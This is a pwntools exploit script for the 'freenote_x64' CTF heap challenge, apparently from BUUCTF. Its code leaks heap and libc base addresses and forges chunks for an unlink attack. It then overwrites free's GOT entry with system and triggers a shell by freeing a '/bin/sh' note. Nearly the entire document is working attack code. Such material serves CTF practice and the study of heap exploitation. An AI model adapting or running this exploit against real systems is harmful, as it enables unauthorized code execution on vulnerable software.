from pwn import *

p = process('./freenote_x64')
#p = remote('node4.buuoj.cn', 29672)
elf = ELF('freenote_x64')
libc = ELF('libc-2.23.so')

context.log_level = 'debug'

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def show():
    sla(b'choice: ', b'1')    

def alloc(size, content):
    sla(b'choice: ', b'2')
    sla(b'new note: ', str(size).encode())
    sa(b'your note: ', content)

def edit(index, size, content):
    sla(b'choice: ', b'3')
    sla(b'Note number: ', str(index).encode())
    sla(b'Length of note: ', str(size).encode())
    sa(b'your note: ', content)

def delete(index):
    sla(b'choice: ', b'4')
    sla(b'number: ', str(index))

alloc(1, b'a') #0
alloc(1, b'a') #1
alloc(1, b'a') #2
alloc(1, b'a') #3

delete(0)
delete(2)

alloc(8, b'a' * 8) #0
alloc(8, b'a' * 8) #2
#delete(0)

show()

ru(b'0. aaaaaaaa')
heap_base = u64(ru(b'\n')[:-1].ljust(8, b'\x00')) - 0x1940
success('heap_base -> {}'.format(hex(heap_base)))

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

[delete(i) for i in range(4)]

# this works on my machine... but not buuctf, wtf
# fd = heap_base + 0x30 - 0x18
# bk = heap_base + 0x30 - 0x10
# fake_chunk = p64(0) + p64(0x101) + p64(fd) + p64(bk)

# next = heap_base + 0x19d0
# current = heap_base + 0x1940

# alloc(0x90, fake_chunk.ljust(0x90, b'\x00'))

# #bypass double-linked unsorted bin check and unlink
# payload = p64(0x110) + p64(0x90) + p64(next) + p64(next)
# payload += b'\x00' * 0x70
# payload += p64(0x90) + p64(0x81) + p64(current) + p64(current)
# alloc(0xb0, payload)

payload01  = p64(0) + p64(0x51) + p64(heap_base + 0x30 - 0x18) + p64(heap_base + 0x30 - 0x10)
payload01 += b'a' * 0x30 + p64(0x50) + p64(0x20)
alloc(len(payload01), payload01)

payload02  = b'a' * 0x80 + p64(0x110) + p64(0x90) + b'a' * 0x80
payload02 += p64(0) + p64(0x71) + b'a' * 0x60
alloc(len(payload02), payload02)
#debug('b free') 
delete(2)


free_got = elf.got['free']
system = libc_base + libc.sym['system']
bin_sh = libc_base + libc.search(b'/bin/sh').__next__()
payload = p64(114) + p64(1) + p64(0x8) + p64(free_got) 
payload += p64(0) + p64(0) + p64(bin_sh)
edit(0, 0x60, payload.ljust(0x60, b'\x00'))
edit(0, 0x8, p64(system))

delete(1)

p.interactive()